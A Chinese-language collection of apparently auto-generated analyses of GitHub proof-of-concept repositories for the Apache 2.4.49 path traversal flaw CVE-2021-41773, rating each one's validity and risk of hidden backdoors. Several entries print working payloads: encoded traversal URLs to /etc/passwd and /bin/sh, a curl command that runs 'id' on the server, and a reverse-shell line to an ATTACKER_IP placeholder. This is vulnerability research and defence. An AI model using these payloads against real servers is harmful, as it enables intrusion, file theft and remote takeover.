1.  **确定目标：** 找到运行 Apache HTTP Server 2.4.49 的目标服务器，并确认 `cgi-bin` 目录已启用。
2.  **构造 Payload：** 使用包含路径遍历的 URL 和要执行的命令构造 HTTP POST 请求。URL 的基本格式如下：
    ```
    /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
    ```
    其中，`.%2e` 是 `..` 的 URL 编码，用于绕过路径检查。`bin/sh` 是要执行的 shell 程序的路径。
3.  **发送请求：**  将构造好的 HTTP POST 请求发送到目标服务器。
4.  **获取结果：**  如果漏洞利用成功，服务器将执行指定的命令，并将结果作为 HTTP 响应返回。

**项目地址:** [gunzf0x/CVE-2021-41773](https://github.com/gunzf0x/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #27

**来源**: [CVE-2021-41773-hackedrishi_CTF_WRITEUPS-TryHackMe-CVE-2021-41773-.md](../2021/CVE-2021-41773-hackedrishi_CTF_WRITEUPS-TryHackMe-CVE-2021-41773-.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，且存在Alias-like指令配置不当或CGI脚本启用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的一个路径穿越漏洞。攻击者可以通过构造包含`..`的恶意URL，绕过Alias-like指令配置的目录限制，访问服务器上的任意文件。如果目标服务器启用了CGI脚本，攻击者可能进一步利用该漏洞执行远程代码。根据漏洞描述，需要特定的配置错误，例如，文件没有被"require all denied"保护。从提供的漏洞利用代码看， 该代码本身是一个 CTF 的 Writeup， 解释了漏洞原理和利用方式，本身不包含恶意代码，但可能存在作者隐藏的后门代码的风险，但是可能性极低。

**有效性：**
该漏洞利用代码(CTF Writeup) 本身不直接用于漏洞利用，而是用于解释该漏洞，根据搜索引擎结果，该漏洞真实存在且被广泛利用。

**投毒风险：**
提供的漏洞利用代码是一个CTF Writeup，主要用于讲解漏洞原理，本身不太可能包含恶意投毒代码， 但为了安全起见， 风险评估为5%。

**利用方式：**
1.  **路径穿越：** 构造包含`..`的URL，例如`/%2e%2e/%2e%2e/%2e%2e/etc/passwd`，尝试访问服务器上的敏感文件，如`/etc/passwd`。
2.  **RCE（如果CGI启用）：**如果服务器配置允许执行CGI脚本，攻击者可以通过上传恶意CGI脚本并执行它，来实现远程代码执行。 需要注意的是，通常需要结合Alias指令的配置不当才能实现。

**利用前提：**
*   Apache HTTP Server版本为2.4.49。
*   目标文件所在目录没有被`require all denied`限制。
*   （可选）服务器启用了CGI脚本，并且Alias指令配置不当。

**项目地址:** [hackedrishi/CTF_WRITEUPS-TryHackMe-CVE-2021-41773-](https://github.com/hackedrishi/CTF_WRITEUPS-TryHackMe-CVE-2021-41773-)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #28

**来源**: [CVE-2021-41773-javaamo_CVE-2021-41773.md](../2021/CVE-2021-41773-javaamo_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行存在漏洞的Apache HTTP Server 2.4.49版本，并启用了cgi-bin目录，且该目录下的文件没有被'require all denied'保护

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773 漏洞是 Apache HTTP Server 2.4.49 版本中存在的路径遍历漏洞。攻击者可以通过构造包含特殊字符的 URL，绕过 Alias 类似的指令配置的目录限制，访问到服务器上的任意文件。如果服务器同时启用了 CGI 脚本支持，攻击者甚至可以执行任意代码。

**有效性：**
根据漏洞描述和提供的漏洞利用代码，该漏洞利用是有效的。搜索引擎结果也表明该漏洞已被公开利用。

**投毒风险：**
提供的漏洞利用代码主要由一个shell脚本和一个README文件组成。shell脚本的功能是向目标服务器发送包含恶意路径的HTTP请求，读取指定文件或执行命令。README文件是对漏洞利用代码的说明。
脚本本身存在投毒的可能性较低，风险预估1%。主要风险点在于targets.txt文件，如果攻击者替换了targets.txt中的目标，可能会导致非授权的扫描或者攻击。需要注意的是，该PoC本身就是用于攻击的，因此不能将利用漏洞的代码判定为投毒。

**利用方式：**
1.  准备：准备一个包含目标服务器地址列表的 `targets.txt` 文件。
2.  路径遍历：使用`./50383.sh targets.txt /etc/passwd`尝试读取敏感文件，例如`/etc/passwd`。
3.  远程代码执行：如果目标服务器启用了 CGI，则可以通过类似`./50383.sh targets.txt /bin/sh whoami`的方式执行命令。
   需要注意的是，该POC代码尝试利用路径遍历漏洞，将请求发送到`/cgi-bin/`目录，从而触发CGI脚本的执行，最终达到远程代码执行的目的. 如果CGI未开启，则只能进行文件读取。

**项目地址:** [javaamo/CVE-2021-41773](https://github.com/javaamo/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #29

**来源**: [CVE-2021-41773-jkska23_Additive-Vulnerability-Analysis-CVE-2021-41773.md](../2021/CVE-2021-41773-jkska23_Additive-Vulnerability-Analysis-CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历和文件泄露

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，且Alias配置存在缺陷，允许访问受限目录外的文件，并且可能开启了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

**有效性分析：**

根据漏洞库信息和搜索引擎结果，CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中存在的路径遍历漏洞，且已被公开利用。搜索引擎结果显示该漏洞允许未经验证的攻击者访问敏感信息，甚至执行任意代码。漏洞库信息也证实了这一点，并指出该漏洞允许攻击者绕过 Alias 指令配置的目录限制，访问未受 "require all denied" 保护的文件。如果目标配置允许，还可能执行 CGI 脚本。

**投毒风险分析：**

提供的“漏洞利用代码”实际上包含两个文件：README.md 和 index.html。

*   **README.md：**  只是一个简单的文本文件，描述了该漏洞和远程代码执行。
*   **index.html：** 是由 pdf2htmlEX 生成的 HTML 文件，用于显示 PDF 内容。这个HTML 文件看起来是正常的，没有任何明显的恶意代码，它的作用仅仅是将PDF转换成了HTML，并没有什么可疑的js或者链接。

因此，提供的代码仓库中**没有**发现任何明显的投毒代码。 投毒风险极低，几乎为0%的可能性

**利用方式：**

利用 CVE-2021-41773 的基本方式是通过构造包含路径遍历字符（如`..%2f`）的 URL 来访问目标服务器上的任意文件。攻击者可以尝试以下步骤：

1.  **确定目标服务器是否运行 Apache HTTP Server 2.4.49。**
2.  **尝试使用路径遍历payload访问敏感文件，例如`/../../../../etc/passwd`。** 使用URL编码来绕过一些常见的安全过滤。
3.  **如果服务器配置允许，尝试执行任意 CGI 脚本。**  这通常涉及到上传恶意脚本并使用路径遍历漏洞来访问和执行它。

**漏洞利用的关键点：**

*   **Alias配置：**  该漏洞依赖于 Apache HTTP Server 的 Alias 指令配置不当。
*   **权限控制：**  被访问的文件必须没有受到 "require all denied" 的保护。
*   **CGI支持：**  如果开启了 CGI 支持，则可能导致远程代码执行。

**项目地址:** [jkska23/Additive-Vulnerability-Analysis-CVE-2021-41773](https://github.com/jkska23/Additive-Vulnerability-Analysis-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #30

**来源**: [CVE-2021-41773-justakazh_mass_cve-2021-41773.md](../2021/CVE-2021-41773-justakazh_mass_cve-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未经身份验证的攻击者读取任意文件和/或执行远程代码

**影响版本:** 2.4.49

**利用条件:** 目标系统运行受影响的 Apache HTTP Server 版本，并配置了Alias指令或启用了CGI脚本执行

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞库信息、搜索结果和提供的漏洞利用代码，CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，如果配置不当，可能导致远程代码执行。该漏洞允许攻击者通过构造包含特殊字符（如 URL 编码的 `%2e` 和 `%2e%2e`）的 URL，来访问服务器上受限目录之外的文件。

**有效性:**

根据漏洞库信息，该漏洞已在野外被利用。提供的 exploit-db 链接 (在 `mass_cve-2021-41773/README.md` 中) 也验证了这一点。提供的python脚本 `cve-2021-41773.py`  通过读取 `/etc/passwd` 文件来检测漏洞存在。另一个脚本 `cve-2021-41773_RCE.py` 尝试通过 cgi-bin 执行命令 `uname`，如果返回 `Linux` 或 `linux`，则认为存在 RCE 漏洞。

**投毒风险:**

检查提供的代码，没有发现明显的恶意或后门代码。所有的脚本都是为了验证漏洞的存在，而不是植入任何持久性的后门。`cve-2021-41773.py`  扫描目标然后保存结果, `cve-2021-41773_RCE.py`  是RCE验证脚本。`cve-2021-41773_manual.py` 允许手动指定命令执行. 因此投毒风险评估为0%。

**利用方式:**

1.  **路径遍历 (文件读取):**  攻击者发送一个精心构造的 HTTP GET 请求，其中包含经过 URL 编码的路径遍历字符，例如 `/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`。如果服务器存在漏洞且目录配置不当，服务器将返回 `/etc/passwd` 的内容。
2.  **远程代码执行 (RCE):**  如果服务器启用了 CGI 脚本执行，攻击者可以使用路径遍历来访问和执行任意脚本。`cve-2021-41773_RCE.py` 脚本通过POST请求向URL发送命令, 例如 `uname`，如果执行成功, 则判定可以RCE.  利用需要服务器配置支持 CGI 脚本，且目标路径没有 require all denied 配置。

**项目地址:** [justakazh/mass_cve-2021-41773](https://github.com/justakazh/mass_cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #31

**来源**: [CVE-2021-41773-khaidtraivch_CVE-2021-41773-Apache-2.4.49-.md](../2021/CVE-2021-41773-khaidtraivch_CVE-2021-41773-Apache-2.4.49-.md)

## CVE-2021-41773 Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可读取敏感文件并远程执行代码

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且启用了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用具有较高的有效性。

**有效性：**

*   漏洞库明确指出该漏洞已被在野利用。
*   搜索结果显示该漏洞允许未经身份验证的攻击者读取敏感信息并执行任意代码。
*   提供的POC代码包含利用路径遍历读取`/etc/passwd`文件的脚本以及通过CGI执行反向shell的脚本，证明了漏洞的可利用性。

**投毒风险：**

虽然POC代码本身实现了明确的漏洞利用功能，但考虑到其来源的安全性无法完全保证，仍存在潜在的投毒风险。具体分析如下：

*   代码的功能相对简单直接，主要依赖于`curl`命令发送HTTP请求。潜在的投毒方式可能包括：
    *   **变量替换：** 攻击者可能尝试修改`TARGET_IP`或`ATTACKER_IP`变量，将利用流量引导至恶意服务器。
    *   **命令注入：** 攻击者可能尝试通过修改`URL`或`POST`数据中的参数，实现命令注入，从而执行恶意代码。虽然在提供的代码中直接注入恶意代码的难度较高，但仍然不能完全排除这种可能性。
    *   **依赖库问题：** 虽然POC主要依赖`curl`和`bash`，但如果运行环境存在其他未知的依赖库，可能存在通过这些依赖库进行投毒的风险。

由于代码较为简短，且功能较为直接，恶意代码隐藏的空间有限。因此，投毒风险相对较低，估计在10%左右。

**利用方式：**

该漏洞的利用方式如下：

1.  **路径遍历：** 利用Apache HTTP Server 2.4.49在路径规范化方面的缺陷，通过构造包含`.%2e`的URL，绕过Alias-like指令的限制，访问服务器上的任意文件。如果目标文件没有被"require all denied"等配置保护，则可以成功读取文件内容，例如`/etc/passwd`。
2.  **远程代码执行：** 如果服务器配置允许CGI脚本执行，攻击者可以通过构造特殊的HTTP POST请求，将恶意代码作为CGI脚本的输入，从而在服务器上执行任意命令。例如，可以使用`bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1`命令建立反向shell，从而完全控制目标服务器。

**防范措施：**

*   升级到Apache HTTP Server 2.4.50或更高版本。
*   配置"require all denied"，限制对敏感文件的访问。
*   禁用不必要的CGI脚本执行。
*   监控服务器日志，及时发现异常请求。

**项目地址:** [khaidtraivch/CVE-2021-41773-Apache-2.4.49-](https://github.com/khaidtraivch/CVE-2021-41773-Apache-2.4.49-)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #32

**来源**: [CVE-2021-41773-luongchivi_CVE-2021-41773.md](../2021/CVE-2021-41773-luongchivi_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致敏感信息泄露和远程代码执行 (Remote Code Execution, RCE)

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且Alias指令配置不当，未对外部文件目录进行访问限制。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中存在的路径遍历漏洞。攻击者可以通过构造包含`/.%2e`或`/%2e%2e`等特殊序列的URL，绕过服务器的路径规范化检查，从而访问Alias指令配置之外的文件。

**有效性：**
提供的Dockerfile和docker-compose.yml文件用于搭建存在CVE-2021-41773漏洞的Apache HTTP Server 2.4.49环境。README.md中提供了利用该漏洞读取`/etc/passwd`文件的POC，验证了漏洞的有效性。搜索引擎结果也表明该漏洞可以被利用来进行路径遍历和远程代码执行。

**投毒风险：**
Dockerfile仅仅是从官方镜像拉取存在漏洞的镜像并复制httpd.conf，httpd.conf是基本的apache配置，没有恶意代码。docker-compose文件只是启动docker。
文件分析结果如下：
*   **Dockerfile:**  该文件用于构建包含漏洞版本的Apache镜像，没有发现恶意行为。
*   **README.md:**  该文件提供了漏洞的POC，用于验证漏洞，其中包含的命令用于读取`/etc/passwd`等文件，属于漏洞利用行为，而非投毒。
*   **docker-compose.yml:**  该文件用于配置和启动Docker容器，没有发现恶意行为。
*   **httpd.conf:**  配置文件为apache的默认配置, 没有恶意行为
虽然没发现明显的恶意代码，但如果使用者不了解漏洞原理，直接部署该环境，可能会造成安全风险。因此，存在极低的投毒风险，约5%。

**利用方式：**
1.  攻击者构造恶意的URL，其中包含`/.%2e`或`/%2e%2e`等序列，用于绕过路径规范化检查。
2.  URL指向`/cgi-bin/`目录下的文件，并利用路径遍历访问目标文件，例如`/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd`。
3.  如果服务器配置允许执行CGI脚本，攻击者甚至可以利用该漏洞执行任意代码，例如通过POST请求传递恶意代码到目标文件。

**修复建议：**
1.  升级到Apache HTTP Server 2.4.50或更高版本。
2.  在Apache配置文件中，对根目录`/`设置`Require all denied`，防止未授权访问。

**项目地址:** [luongchivi/CVE-2021-41773](https://github.com/luongchivi/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #33

**来源**: [CVE-2021-41773-mah4nzfr_CVE-2021-41773.md](../2021/CVE-2021-41773-mah4nzfr_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且启用了 cgi-bin 目录，Alias配置不当，存在文件系统权限问题。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞库信息和搜索结果，CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中。该漏洞是由于路径规范化处理的缺陷导致的路径遍历漏洞，攻击者可以利用该漏洞访问服务器上受限目录之外的文件。如果服务器的 Alias 配置不当，并且文件系统权限设置不合理，攻击者甚至可以通过上传恶意 CGI 脚本来实现远程代码执行。

**有效性：**
提供的 POC 代码看起来是有效的。它利用了路径遍历漏洞，尝试访问 `/bin/sh` 可执行文件，并通过 POST 请求传递包含反向 shell 命令的 DATA。`--path-as-is` 选项确保 curl 不会对 URL 进行规范化，从而允许路径遍历。

**投毒风险：**
漏洞利用代码本身看起来比较直接，目的是触发一个反向shell。`LICENSE`文件正常。
检查以下内容：
1.  **代码混淆：** 代码没有被混淆。
2.  **隐藏命令：** 没有发现隐藏或混淆的命令。
3.  **依赖项：**  该脚本不依赖于任何外部文件或库。
4.  **作者信誉：**  作者的github需要进一步评估，但目前从代码本身看不出明显的恶意。
综合评估，存在投毒代码的可能性较低，估计为 10%。风险主要在于如果攻击成功，攻击者能够在目标系统上执行任意命令，这本身就构成了极大的安全风险。

**利用方式：**
1.  **路径遍历：**  利用 `/.%2e/%2e%2e/` 序列绕过 Apache 的路径访问限制。
2.  **CGI 执行：**  如果 `cgi-bin` 目录已启用，攻击者可以将请求指向该目录。
3.  **反向 Shell：**  通过 POST 请求，攻击者传递一个包含反向 shell 命令的字符串，该命令会在服务器上执行，从而使攻击者获得对服务器的远程访问权限。
4. **payload构造:** 首先构造畸形的URL, 包含`/.%2e/%2e%2e/` 序列, 并指定到系统程序`/bin/sh`, 通过`POST`方法,将需要执行的代码注入到`DATA`变量中.

**总结：**
CVE-2021-41773 是一个严重的安全漏洞，可以被利用进行路径遍历和远程代码执行。提供的 POC 代码可以有效利用此漏洞，但是务必在授权的情况下进行测试。代码本身投毒风险较低，但成功利用漏洞后的风险极高。

**项目地址:** [mah4nzfr/CVE-2021-41773](https://github.com/mah4nzfr/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #34

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773-PoC.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773-PoC.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致文件泄露，甚至远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，且Alias配置的目录未启用 "require all denied" 保护，CGI脚本需要启用。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的路径遍历漏洞。攻击者可以利用该漏洞，通过构造包含特殊字符的URL，绕过Alias指令的限制，访问服务器上未授权的文件。如果目标服务器同时启用了CGI脚本支持，则攻击者可能进一步利用此漏洞执行任意代码。

**有效性：**

根据漏洞库信息、搜索结果和漏洞利用代码，可以判断该漏洞的POC代码是有效的。漏洞库中明确指出此漏洞已被在野利用。搜索引擎结果也显示了POC的存在和利用方式。

**投毒风险：**

提供的Dockerfile中，核心操作是：

1.  `FROM httpd:2.4.49`:  指定基础镜像为httpd:2.4.49，这是一个官方镜像，降低了投毒的可能性。
2.  `RUN sed -i 's/Require all denied/# Require all denied/g' /usr/local/apache2/conf/httpd.conf`:  这行代码将httpd.conf文件中的`Require all denied`注释掉。这正是为了使漏洞更容易被利用。如果没有这一行，即使存在路径遍历，也无法读取到未授权的文件（因为默认是拒绝所有访问）。这部分不是投毒，而是为了方便漏洞验证。
其他文件是`LICENSE`，仅包含Apache License 2.0的文本，不涉及任何恶意代码。

因此，直接的恶意投毒代码的可能性较低，但该Dockerfile的意图是创造一个存在漏洞的环境，以便更容易地利用漏洞。该仓库本身并没有主动植入恶意代码，而是提供了一个方便利用漏洞的环境。考虑到该行为可能被恶意利用，判定存在10%的投毒风险，因为此Dockerfile的目的是为了移除安全防护，为攻击者降低利用门槛。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含`..%2f`的URL，尝试访问受限目录之外的文件。`%2f`是`/`的URL编码，`..`表示上一级目录。多次使用`..%2f`可以突破目录限制。
2.  **文件读取：** 如果成功绕过限制，攻击者可以读取服务器上的任意文件，例如配置文件、源代码等。
3.  **远程代码执行 (RCE)：** 如果目标服务器启用了CGI，攻击者可以通过上传恶意CGI脚本并执行，实现远程代码执行。利用路径遍历，将请求发送到位于服务器文件系统上的CGI脚本，从而执行任意命令。

例如，攻击者可以使用如下URL读取`/etc/passwd`文件：

`http://target/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd`

如果启用了CGI，攻击者可以尝试利用路径遍历访问并执行CGI脚本，例如：

`http://target/cgi-bin/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fpath/to/malicious.cgi`

**项目地址:** [mightysai1997/CVE-2021-41773-PoC](https://github.com/mightysai1997/CVE-2021-41773-PoC)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #35

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773-i-.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773-i-.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致敏感信息泄露或远程代码执行 (取决于配置)

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行 Apache HTTP Server 2.4.49，且 Alias 指令配置不当或 CGI 脚本启用。需要可以发送 HTTP 请求的网络访问。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中存在的一个路径遍历漏洞。该漏洞源于 Apache HTTP Server 在路径规范化方面存在缺陷，攻击者可以利用该漏洞将 URL 映射到 Alias 指令配置目录之外的文件。如果这些目录之外的文件没有受到 "require all denied" 等默认配置的保护，请求就可以成功。如果为这些 Aliased 路径启用了 CGI 脚本，则可能导致远程代码执行。

**漏洞利用方式：**

攻击者通过构造包含特殊编码（如 `%2e`）的路径的 HTTP 请求，绕过 Apache HTTP Server 的路径检查，从而访问受限目录之外的文件。例如，`GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1` 这样的请求可以尝试读取服务器上的 `/etc/passwd` 文件。

根据提供的 Dockerfile 和 README.md，PoC 的有效性依赖于两个关键步骤：

1.  **Dockerfile:** 使用 `httpd:2.4.49` 镜像，确保存在漏洞的 Apache 版本。
2.  **httpd.conf:**  修改 `httpd.conf` 文件，将 `<Directory />` 部分的 `Require all denied` 更改为 `Require all granted`。这一步**至关重要**，因为 `Require all denied` 配置会阻止对根目录的访问，从而阻止漏洞利用。如果未修改此配置，即使存在漏洞，也无法读取文件。

**投毒风险分析：**

分析提供的 Dockerfile 和 httpd.conf 文件，发现投毒代码的风险较低，估计为 5%。主要风险在于以下可能性：

*   **`httpd.conf` 修改的误导性:**  虽然 README.md 中明确说明了修改 `Require all denied` 的原因，但如果用户盲目复制粘贴配置文件，可能会在无意中降低服务器的安全性。
*   **CGI脚本的滥用:** 虽然PoC本身不包含恶意CGI脚本，但如果服务器上存在未授权或存在漏洞的CGI脚本，攻击者可能会利用该漏洞执行恶意代码。

总体来说，该 PoC 主要用于演示漏洞，但使用者应该意识到其潜在的安全风险。

**项目地址:** [mightysai1997/CVE-2021-41773-i-](https://github.com/mightysai1997/CVE-2021-41773-i-)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #36

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773S.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773S.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 & 远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未授权的攻击者访问敏感信息，甚至执行任意代码。

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且配置允许CGI脚本执行或者存在Alias-like指令的配置。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中存在的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造特殊的 URL，绕过 Alias-like 指令的限制，访问服务器上受限目录之外的文件。如果服务器同时启用了 CGI 脚本执行，攻击者还可以通过该漏洞执行任意代码。

**有效性：**

提供的 PoC 代码是有效的。通过发送包含 URL 编码的路径遍历字符的 HTTP 请求，可以读取`/etc/passwd`等敏感文件，或者如果启用了 CGI，则可以执行系统命令。

例如，使用 `curl http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd` 可以尝试读取`/etc/passwd`文件。
如果服务器配置允许 CGI 执行，使用 `curl 'localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'A=|echo;id'` 可以在服务器上执行 `id` 命令。

**投毒风险：**

查看提供的 Dockerfile 和 httpd.conf 文件，未发现明显的恶意代码。`blueteamsteve` 提供的 Docker 镜像配置目的是为了复现漏洞，使得利用更加方便。虽然代码本身没有恶意，但如果攻击者修改 Dockerfile 或者 httpd.conf 文件，加入恶意代码并重新构建镜像，可能会存在投毒风险。从现有信息判断，代码本身投毒风险极低，给出1%的概率。 

**利用方式：**

1.  **路径遍历：** 攻击者通过构造包含`/.%2e/.%2e/`的特殊 URL，尝试访问服务器上的任意文件。`%2e` 是`.`的 URL 编码，用于绕过某些安全限制。
2.  **远程代码执行（RCE）：** 如果服务器启用了 CGI 脚本，攻击者可以通过路径遍历访问到 `/bin/sh` 等 shell 程序，并执行任意命令。

为了成功利用该漏洞，目标服务器需要满足以下条件：

*   运行 Apache HTTP Server 2.4.49 版本。
*   服务器的配置存在 Alias-like 指令，且对受限目录之外的文件没有进行严格的访问控制。
*   可选：服务器启用了 CGI 脚本执行。

**项目地址:** [mightysai1997/CVE-2021-41773S](https://github.com/mightysai1997/CVE-2021-41773S)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #37

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773h.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773h.md)

## CVE-2021-41773-Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行受影响的 Apache HTTP Server 版本，并且 Alias 指令配置不当，允许访问受限目录之外的文件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造包含特殊字符的 URL，绕过 Alias 指令的限制，访问服务器上未授权的文件。如果服务器配置允许 CGI 脚本在这些 aliased 路径下执行，则攻击者可能进一步实现远程代码执行。

**有效性分析：**

根据漏洞库信息和搜索结果，CVE-2021-41773 在野外已被利用。提供的 Dockerfile 使用了 `httpd:2.4.49-alpine` 镜像，明确指定了受影响的 Apache 版本。Dockerfile 下载并替换了默认的 `httpd.conf` 配置文件。如果这个 `httpd.conf` 配置不安全，例如没有正确的 `Require all denied` 规则，那么漏洞利用将是有效的。综上所述，该POC的有效性较高，但依赖于 `httpd.conf` 的具体内容。

**投毒风险分析：**

提供的文件列表中，`LICENSE` 文件是标准的 Apache 许可证，没有投毒风险。Dockerfile本身只包含下载配置文件和替换配置文件的操作。投毒风险主要在于从 `https://raw.githubusercontent.com/itsecurityco/CVE-2021-41773/main/httpd.conf` 下载的 `httpd.conf` 文件。攻击者可能会修改该文件，例如：

*   **放宽访问限制：**  允许访问敏感目录，例如 `/var/www/html` 之外的目录。
*   **配置恶意 CGI 脚本：**  允许执行任意代码。
*   **植入后门：**  在配置文件中添加恶意指令，例如通过 mod_rewrite 实现后门访问。

由于无法直接分析远程 `httpd.conf` 文件的内容，因此存在一定的投毒风险。 这里估计投毒风险为 10%，因为该项目看起来是为了演示漏洞，不太可能包含恶意代码，但仍然需要谨慎。

**利用方式分析：**

利用方式主要通过构造恶意的 HTTP GET 请求，其中包含经过 URL 编码的路径遍历字符。例如，可以使用 `%2e%2e/` 或 `%252e%252e/` 来绕过路径规范化，访问目标目录之外的文件。

例如，如果目标服务器存在以下 Alias 配置：

```
Alias /images /var/www/images
```

攻击者可以使用以下 URL 访问 `/etc/passwd` 文件：

```
GET /images/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
```

如果 CGI 脚本已启用，则可以构造包含恶意代码的 CGI 脚本，并通过路径遍历漏洞执行它，从而实现远程代码执行。

**项目地址:** [mightysai1997/CVE-2021-41773h](https://github.com/mightysai1997/CVE-2021-41773h)

